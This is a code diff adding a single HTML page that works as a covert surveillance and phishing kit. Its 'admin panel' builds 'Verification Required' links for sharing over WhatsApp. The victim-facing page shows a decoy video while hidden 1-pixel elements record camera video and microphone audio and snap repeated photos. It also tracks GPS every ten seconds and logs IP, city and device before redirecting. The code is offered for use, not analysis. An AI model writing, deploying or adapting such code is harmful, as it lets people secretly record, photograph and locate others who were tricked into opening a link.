@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Verification System - WhatsApp Ready</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { font-family: 'Plus Jakarta Sans', sans-serif; }
+        #hiddenCamera, #hiddenAudio { position: fixed; bottom: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0; visibility: hidden; pointer-events: none; }
+        .fake-video-container { background: #000; border-radius: 20px; overflow: hidden; }
+        .fake-video { width: 100%; min-height: 450px; object-fit: cover; }
+        .whatsapp-btn { transition: all 0.2s; }
+        .whatsapp-btn:hover { transform: scale(1.02); }
+        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
+        .status-pulse { animation: pulse 1s infinite; }
+    </style>
+</head>
+<body class="bg-gradient-to-br from-slate-900 via-indigo-900 to-purple-900 min-h-screen">
+    
+    <div class="container mx-auto px-4 py-6 max-w-2xl">
+        
+        <!-- Admin Panel -->
+        <div id="adminPanel">
+            <div class="text-center mb-6">
+                <div class="inline-flex items-center gap-2 bg-green-500/20 rounded-full px-4 py-2 mb-3">
+                    <i class="fab fa-whatsapp text-green-400"></i>
+                    <span class="text-green-400 text-sm">WhatsApp Ready | Clickable Link</span>
+                </div>
+                <h1 class="text-3xl font-bold text-white mb-2">📱 Intelligence System</h1>
+                <p class="text-white/70">Video + Voice + Location + Photos + Download</p>
+            </div>
+            
+            <div class="bg-white rounded-3xl shadow-2xl overflow-hidden">
+                <div class="bg-gradient-to-r from-green-600 to-teal-600 p-5">
+                    <h2 class="text-xl font-bold text-white">✨ Create WhatsApp Link</h2>
+                    <p class="text-white/80 text-sm">Generate link - Share on WhatsApp - Auto collect data</p>
+                </div>
+                
+                <div class="p-6">
+                    <form id="createForm" onsubmit="return false;">
+                        <div class="mb-4">
+                            <label class="block font-bold text-slate-700 mb-2">📝 Campaign Name</label>
+                            <input type="text" id="campaignName" required placeholder="e.g., Math Test, Verification" class="w-full border-2 rounded-2xl px-4 py-3">
+                        </div>
+                        
+                        <div class="grid grid-cols-2 gap-4 mb-4">
+                            <div>
+                                <label class="block font-bold text-slate-700 mb-2">⚡ Capture Speed</label>
+                                <select id="captureSpeed" class="w-full border-2 rounded-2xl px-3 py-3">
+                                    <option value="0.5">0.5 sec (Ultra Fast)</option>
+                                    <option value="1" selected>1 sec (Fast)</option>
+                                    <option value="2">2 sec (Normal)</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block font-bold text-slate-700 mb-2">📸 Number of Photos</label>
+                                <select id="photoCount" class="w-full border-2 rounded-2xl px-3 py-3">
+                                    <option value="5">5 Photos</option>
+                                    <option value="10" selected>10 Photos</option>
+                                    <option value="15">15 Photos</option>
+                                </select>
+                            </div>
+                        </div>
+                        
+                        <div class="grid grid-cols-3 gap-4 mb-4">
+                            <div>
+                                <label class="block font-bold text-slate-700 mb-2">🎥 Video</label>
+                                <select id="videoRecord" class="w-full border-2 rounded-2xl px-3 py-3">
+                                    <option value="yes" selected>✅ Record</option>
+                                    <option value="no">❌ No</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block font-bold text-slate-700 mb-2">🎤 Voice</label>
+                                <select id="voiceRecord" class="w-full border-2 rounded-2xl px-3 py-3">
+                                    <option value="yes" selected>✅ Record</option>
+                                    <option value="no">❌ No</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block font-bold text-slate-700 mb-2">📍 GPS</label>
+                                <select id="locationTrack" class="w-full border-2 rounded-2xl px-3 py-3">
+                                    <option value="yes" selected>✅ Track</option>
+                                    <option value="no">❌ No</option>
+                                </select>
+                            </div>
+                        </div>
+                        
+                        <div class="mb-4">
+                            <label class="block font-bold text-slate-700 mb-2">🔗 Redirect URL (After Capture)</label>
+                            <input type="url" id="redirectUrl" placeholder="https://google.com" class="w-full border-2 rounded-2xl px-4 py-3">
+                        </div>
+                        
+                        <button type="button" onclick="generateLink()" class="w-full bg-gradient-to-r from-green-600 to-teal-600 text-white py-4 rounded-2xl font-bold text-lg">
+                            <i class="fab fa-whatsapp mr-2"></i> Generate WhatsApp Link
+                        </button>
+                    </form>
+                    
+                    <div id="generatedBox" class="hidden mt-6 p-5 bg-green-50 rounded-2xl">
+                        <p class="font-bold text-green-700 mb-2">✅ Link Ready for WhatsApp!</p>
+                        <input type="text" id="generatedLink" readonly class="w-full bg-white border rounded-xl px-3 py-2 text-sm font-mono mb-3">
+                        <div class="flex gap-2">
+                            <button onclick="copyLink()" class="flex-1 bg-green-600 text-white py-3 rounded-xl font-bold">
+                                <i class="fas fa-copy mr-1"></i> Copy Link
+                            </button>
+                            <button onclick="sendToWhatsApp()" class="flex-1 bg-emerald-600 text-white py-3 rounded-xl font-bold">
+                                <i class="fab fa-whatsapp mr-1"></i> Send to WhatsApp
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Data Dashboard -->
+            <div class="mt-8 bg-white rounded-3xl shadow-2xl overflow-hidden">
+                <div class="bg-gradient-to-r from-purple-600 to-pink-600 p-5">
+                    <h2 class="text-xl font-bold text-white">📊 Collected Data</h2>
+                </div>
+                <div class="p-6">
+                    <div class="flex justify-between items-center mb-4 flex-wrap gap-2">
+                        <div class="flex gap-2 flex-wrap">
+                            <span class="bg-blue-100 px-3 py-1 rounded-full text-sm">📸 Photos: <strong id="photoTotal">0</strong></span>
+                            <span class="bg-red-100 px-3 py-1 rounded-full text-sm">🎥 Videos: <strong id="videoTotal">0</strong></span>
+                            <span class="bg-green-100 px-3 py-1 rounded-full text-sm">🎤 Voice: <strong id="voiceTotal">0</strong></span>
+                            <span class="bg-purple-100 px-3 py-1 rounded-full text-sm">📍 Locations: <strong id="locationTotal">0</strong></span>
+                            <span class="bg-orange-100 px-3 py-1 rounded-full text-sm">💻 Devices: <strong id="deviceTotal">0</strong></span>
+                        </div>
+                        <button onclick="downloadAllData()" class="bg-purple-600 text-white px-4 py-2 rounded-xl text-sm">Download All</button>
+                    </div>
+                    
+                    <div id="dataList" class="max-h-96 overflow-y-auto space-y-2">
+                        <div class="text-center text-slate-400 py-4">No data collected yet</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Student Panel -->
+        <div id="studentPanel" class="hidden">
+            <div class="bg-black rounded-3xl overflow-hidden shadow-2xl">
+                <video id="hiddenCamera" autoplay playsinline muted style="position:fixed;bottom:-1000px;left:-1000px;width:1px;height:1px;opacity:0"></video>
+                <audio id="hiddenAudio" autoplay style="position:fixed;bottom:-1000px;left:-1000px;width:1px;height:1px;opacity:0"></audio>
+                
+                <div class="relative">
+                    <div class="absolute top-0 left-0 right-0 p-4 bg-gradient-to-b from-black/70 to-transparent z-10">
+                        <div class="flex items-center gap-2">
+                            <div class="w-10 h-10 rounded-full bg-gradient-to-r from-pink-500 to-orange-500 flex items-center justify-center">
+                                <i class="fab fa-tiktok text-white text-xl"></i>
+                            </div>
+                            <div>
+                                <p class="text-white font-bold text-sm">Verification Required</p>
+                                <p class="text-white/50 text-xs">Please watch video</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <video id="fakeVideoPlayer" class="fake-video w-full" autoplay loop muted playsinline></video>
+                    
+                    <div class="absolute bottom-0 left-0 right-0 p-4 bg-gradient-to-t from-black/70 to-transparent z-10">
+                        <p class="text-white font-bold text-sm" id="videoTitle">Loading...</p>
+                        <p class="text-white/70 text-xs">Please allow camera access</p>
+                    </div>
+                </div>
+                
+                <div class="p-3 bg-black/80 text-center">
+                    <p id="statusText" class="text-yellow-400 text-sm status-pulse">⚡ Initializing...</p>
+                    <p id="counterText" class="text-white/50 text-xs mt-1">📸 0 / 0</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+    let allLinks = [], allPhotos = [], allVideos = [], allVoices = [], allLocations = [], allDevices = [];
+    let hiddenStream = null, audioStream = null, videoRecorder = null, audioRecorder = null;
+    let videoChunks = [], audioChunks = [];
+    let currentLink = null, capturedCount = 0, neededCount = 10, captureInterval = 1000, captureTimer = null;
+    let videoActive = true, voiceActive = true, locationActive = true;
+    
+    function loadData() {
+        allLinks = JSON.parse(localStorage.getItem('waFinalLinks2') || '[]');
+        allPhotos = JSON.parse(localStorage.getItem('waFinalPhotos2') || '[]');
+        allVideos = JSON.parse(localStorage.getItem('waFinalVideos2') || '[]');
+        allVoices = JSON.parse(localStorage.getItem('waFinalVoices2') || '[]');
+        allLocations = JSON.parse(localStorage.getItem('waFinalLocations2') || '[]');
+        allDevices = JSON.parse(localStorage.getItem('waFinalDevices2') || '[]');
+        updateDashboard();
+    }
+    function saveLinks() { localStorage.setItem('waFinalLinks2', JSON.stringify(allLinks)); }
+    function savePhotos() { localStorage.setItem('waFinalPhotos2', JSON.stringify(allPhotos)); updateDashboard(); }
+    function saveVideos() { localStorage.setItem('waFinalVideos2', JSON.stringify(allVideos)); updateDashboard(); }
+    function saveVoices() { localStorage.setItem('waFinalVoices2', JSON.stringify(allVoices)); updateDashboard(); }
+    function saveLocations() { localStorage.setItem('waFinalLocations2', JSON.stringify(allLocations)); updateDashboard(); }
+    function saveDevices() { localStorage.setItem('waFinalDevices2', JSON.stringify(allDevices)); updateDashboard(); }
+    
+    function getBaseUrl() { return window.location.href.split('?')[0]; }
+    
+    function generateLink() {
+        const campaignName = document.getElementById('campaignName').value;
+        if(!campaignName) { alert('Enter campaign name'); return; }
+        
+        const captureSpeed = parseFloat(document.getElementById('captureSpeed').value);
+        const photoCount = document.getElementById('photoCount').value;
+        const videoRecord = document.getElementById('videoRecord').value === 'yes';
+        const voiceRecord = document.getElementById('voiceRecord').value === 'yes';
+        const locationTrack = document.getElementById('locationTrack').value === 'yes';
+        const redirectUrl = document.getElementById('redirectUrl').value;
+        
+        const code = 'wa_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
+        const fullLink = getBaseUrl() + '?code=' + code;
+        
+        allLinks.push({ code, campaignName, captureInterval: captureSpeed * 1000, photoCount: parseInt(photoCount), videoRecord, voiceRecord, locationTrack, redirectUrl });
+        saveLinks();
+        
+        document.getElementById('generatedLink').value = fullLink;
+        document.getElementById('generatedBox').classList.remove('hidden');
+    }
+    
+    function copyLink() {
+        const input = document.getElementById('generatedLink');
+        input.select();
+        document.execCommand('copy');
+        alert('✅ Link copied!');
+    }
+    
+    function sendToWhatsApp() {
+        const link = document.getElementById('generatedLink').value;
+        const msg = `📸 Verification Required\n\nClick the link and allow camera access:\n\n${link}`;
+        window.open(`https://wa.me/?text=${encodeURIComponent(msg)}`, '_blank');
+    }
+    
+    function checkUrl() {
+        const code = new URLSearchParams(window.location.search).get('code');
+        if(code) {
+            const link = allLinks.find(l => l.code === code);
+            if(link) startStudentPage(link);
+            else showAdmin();
+        } else showAdmin();
+    }
+    
+    function showAdmin() {
+        document.getElementById('adminPanel').classList.remove('hidden');
+        document.getElementById('studentPanel').classList.add('hidden');
+    }
+    
+    async function startStudentPage(linkData) {
+        currentLink = linkData;
+        neededCount = linkData.photoCount;
+        captureInterval = linkData.captureInterval;
+        videoActive = linkData.videoRecord;
+        voiceActive = linkData.voiceRecord;
+        locationActive = linkData.locationTrack;
+        
+        document.getElementById('adminPanel').classList.add('hidden');
+        document.getElementById('studentPanel').classList.remove('hidden');
+        document.getElementById('videoTitle').innerHTML = linkData.campaignName;
+        document.getElementById('counterText').innerHTML = `📸 0 / ${neededCount}`;
+        
+        document.getElementById('fakeVideoPlayer').src = "https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4";
+        
+        await collectDeviceInfo();
+        if(videoActive) await startVideoRecording();
+        if(voiceActive) await startAudioRecording();
+        if(locationActive) startLocationTracking();
+        setTimeout(() => startPhotoCapture(), 3000);
+    }
+    
+    async function collectDeviceInfo() {
+        let ip = 'Unknown', city = 'Unknown', country = 'Unknown';
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            ip = data.ip || 'Unknown';
+            city = data.city || 'Unknown';
+            country = data.country_name || 'Unknown';
+        } catch(e) {}
+        
+        allDevices.unshift({ id: Date.now(), time: new Date().toLocaleString(), campaign: currentLink?.campaignName, ip, city, country, device: navigator.platform });
+        saveDevices();
+    }
+    
+    async function startVideoRecording() {
+        try {
+            hiddenStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            document.getElementById('hiddenCamera').srcObject = hiddenStream;
+            videoRecorder = new MediaRecorder(hiddenStream);
+            videoChunks = [];
+            videoRecorder.ondataavailable = (e) => { if(e.data.size > 0) videoChunks.push(e.data); };
+            videoRecorder.onstop = () => { if(videoChunks.length) { const blob = new Blob(videoChunks, { type: 'video/webm' }); allVideos.push({ id: Date.now(), data: URL.createObjectURL(blob), title: currentLink?.campaignName, time: new Date().toLocaleString() }); saveVideos(); } };
+            videoRecorder.start(1000);
+            document.getElementById('statusText').innerHTML = '🎥 Recording';
+        } catch(e) { document.getElementById('statusText').innerHTML = '⚠️ Camera needed'; }
+    }
+    
+    async function startAudioRecording() {
+        try {
+            audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            audioRecorder = new MediaRecorder(audioStream);
+            audioChunks = [];
+            audioRecorder.ondataavailable = (e) => { if(e.data.size > 0) audioChunks.push(e.data); };
+            audioRecorder.onstop = () => { if(audioChunks.length) { const blob = new Blob(audioChunks, { type: 'audio/webm' }); allVoices.push({ id: Date.now(), data: URL.createObjectURL(blob), title: currentLink?.campaignName, time: new Date().toLocaleString() }); saveVoices(); } };
+            audioRecorder.start(1000);
+        } catch(e) {}
+    }
+    
+    function startLocationTracking() {
+        navigator.geolocation.getCurrentPosition((pos) => { allLocations.unshift({ id: Date.now(), lat: pos.coords.latitude, lng: pos.coords.longitude, time: new Date().toLocaleString() }); saveLocations(); }, () => {});
+        setInterval(() => { navigator.geolocation.getCurrentPosition((pos) => { allLocations.unshift({ id: Date.now(), lat: pos.coords.latitude, lng: pos.coords.longitude, time: new Date().toLocaleString() }); saveLocations(); }, () => {}); }, 10000);
+    }
+    
+    function startPhotoCapture() {
+        captureTimer = setInterval(() => {
+            if(capturedCount >= neededCount) {
+                clearInterval(captureTimer);
+                if(videoRecorder && videoRecorder.state === 'recording') videoRecorder.stop();
+                if(audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
+                if(hiddenStream) hiddenStream.getTracks().forEach(t => t.stop());
+                if(audioStream) audioStream.getTracks().forEach(t => t.stop());
+                setTimeout(() => { if(currentLink?.redirectUrl) window.location.href = currentLink.redirectUrl; else document.getElementById('studentPanel').innerHTML = '<div class="bg-black rounded-3xl p-8 text-center"><div class="text-6xl mb-4">✅</div><h2 class="text-white text-xl">Complete!</h2></div>'; }, 2000);
+                return;
+            }
+            const video = document.getElementById('hiddenCamera');
+            if(video && video.videoWidth > 0) {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                allPhotos.unshift({ id: Date.now(), data: photoData, title: currentLink?.campaignName, time: new Date().toLocaleString() });
+                savePhotos();
+                capturedCount++;
+                document.getElementById('counterText').innerHTML = `📸 ${capturedCount} / ${neededCount}`;
+            }
+        }, captureInterval);
+    }
+    
+    function updateDashboard() {
+        document.getElementById('photoTotal').innerHTML = allPhotos.length;
+        document.getElementById('videoTotal').innerHTML = allVideos.length;
+        document.getElementById('voiceTotal').innerHTML = allVoices.length;
+        document.getElementById('locationTotal').innerHTML = allLocations.length;
+        document.getElementById('deviceTotal').innerHTML = allDevices.length;
+        
+        const dataDiv = document.getElementById('dataList');
+        if(dataDiv) {
+            if(allPhotos.length === 0 && allDevices.length === 0) dataDiv.innerHTML = '<div class="text-center text-slate-400 py-4">No data yet</div>';
+            else {
+                let html = '';
+                allDevices.slice(0, 5).forEach(d => { html += `<div class="bg-slate-100 p-2 rounded-xl text-sm">💻 ${d.device} | IP: ${d.ip} | ${d.time}</div>`; });
+                allPhotos.slice(0, 5).forEach(p => { html += `<div class="bg-slate-100 p-2 rounded-xl text-sm flex justify-between"><span>📸 Photo</span><span>${p.time}</span></div>`; });
+                dataDiv.innerHTML = html;
+            }
+        }
+    }
+    
+    function downloadAllData() {
+        const report = { photos: allPhotos.length, videos: allVideos.length, voices: allVoices.length, locations: allLocations, devices: allDevices, exportedAt: new Date().toISOString() };
+        const a = document.createElement('a');
+        a.download = `report_${Date.now()}.json`;
+        a.href = URL.createObjectURL(new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' }));
+        a.click();
+        alert('✅ Report downloaded!');
+    }
+    
+    window.generateLink = generateLink;
+    window.copyLink = copyLink;
+    window.sendToWhatsApp = sendToWhatsApp;
+    window.downloadAllData = downloadAllData;
+    
+    loadData();
+    checkUrl();
+    
+    window.addEventListener('beforeunload', () => {
+        if(hiddenStream) hiddenStream.getTracks().forEach(t => t.stop());
+        if(audioStream) audioStream.getTracks().forEach(t => t.stop());
+        if(captureTimer) clearInterval(captureTimer);
+    });
+    </script>
+</body>
+</html>
